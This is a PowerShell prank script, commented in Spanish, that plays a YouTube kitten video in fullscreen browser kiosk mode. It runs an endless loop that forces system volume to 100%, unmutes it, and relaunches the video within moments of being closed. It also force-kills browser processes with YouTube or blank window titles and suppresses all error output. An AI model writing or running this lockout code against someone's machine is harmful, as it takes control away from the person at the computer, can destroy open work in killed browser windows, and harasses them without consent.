<#
  run.ps1 - gatitos a pantalla completa + reopen instantáneo
  Sin iframe (soluciona Error 153)
#>

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'
try { [Net.ServicePointManager]::SecurityProtocol = 3072 } catch {}

# Video de gatitos
$videoId = 'ik-nB-VKuEM'
$titulo  = 'YouTube'
$perfil  = Join-Path $env:TEMP 'venice_kiosk'

# ---------------- volumen al 100% ----------------
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDevEnum { }
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator { int _1(); int GetDefaultAudioEndpoint(int flow, int role, out IMMDevice dev); }
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice { int Activate(ref Guid iid, int ctx, IntPtr p, [MarshalAs(UnmanagedType.IUnknown)] out object o); }
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume {
  int _1(); int _2(); int _3();
  int SetMasterVolumeLevel(float f, IntPtr c);
  int SetMasterVolumeLevelScalar(float f, IntPtr c);
  int GetMasterVolumeLevel(out float f);
  int GetMasterVolumeLevelScalar(out float f);
  int _8(); int _9(); int _10(); int _11();
  int SetMute(int m, IntPtr c);
  int GetMute(out int m);
}
public static class Vol {
  static IAudioEndpointVolume V() {
    var e = (IMMDeviceEnumerator)(new MMDevEnum());
    IMMDevice d; e.GetDefaultAudioEndpoint(0, 1, out d);
    Guid iid = typeof(IAudioEndpointVolume).GUID;
    object o; d.Activate(ref iid, 1, IntPtr.Zero, out o);
    return (IAudioEndpointVolume)o;
  }
  public static void Set(float v) { var a = V(); a.SetMasterVolumeLevelScalar(v, IntPtr.Zero); a.SetMute(0, IntPtr.Zero); }
}
'@

# ---------------- navegador ----------------
function Get-Nav {
  $c = @(
    "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe",
    "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe",
    "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
    "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
    "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
  )
  foreach ($p in $c) { if (Test-Path $p) { return $p } }
  return $null
}

$nav = Get-Nav
if (-not $nav) { exit }
$proc = [IO.Path]::GetFileNameWithoutExtension($nav)

# URL directa de YouTube (sin embed)
$url = "https://www.youtube.com/watch?v=$videoId&autoplay=1"

$flags = "--kiosk `"$url`" --user-data-dir=`"$perfil`" --no-first-run " +
         "--no-default-browser-check --disable-session-crashed-bubble --noerrdialogs " +
         "--autoplay-policy=no-user-gesture-required --disable-infobars " +
         "--disable-features=Translate,msEdgeWelcomePage,EdgeCollections,msEdgeSidebarV2"
if ($nav -match 'msedge') { $flags += ' --edge-kiosk-type=fullscreen' }

$script:pidNav = 0
function Lanzar {
  # Matar cualquier instancia anterior del perfil para que sea limpio
  Get-Process -Name $proc -ErrorAction SilentlyContinue | Where-Object {
    try { $_.MainWindowTitle -like "*YouTube*" -or $_.MainWindowTitle -eq "" } catch { $false }
  } | Stop-Process -Force -ErrorAction SilentlyContinue

  $p = Start-Process -FilePath $nav -ArgumentList $flags -PassThru
  if ($p) { $script:pidNav = $p.Id }
}

# Primera apertura
Lanzar
Start-Sleep -Milliseconds 1200

# ---------------- bucle ultra rápido ----------------
while ($true) {
  [Vol]::Set(1.0)   # volumen 100% siempre

  $existe = $false
  $ventanas = Get-Process -Name $proc -ErrorAction SilentlyContinue
  foreach ($v in $ventanas) {
    if ($v.MainWindowTitle -like "*YouTube*" -or $v.MainWindowTitle -like "*gatit*" -or $v.Id -eq $script:pidNav) {
      $existe = $true
      break
    }
  }

  # Si no hay ventana de YouTube → reabrir inmediatamente
  if (-not $existe) {
    Lanzar
    Start-Sleep -Milliseconds 800
  }

  Start-Sleep -Milliseconds 150
}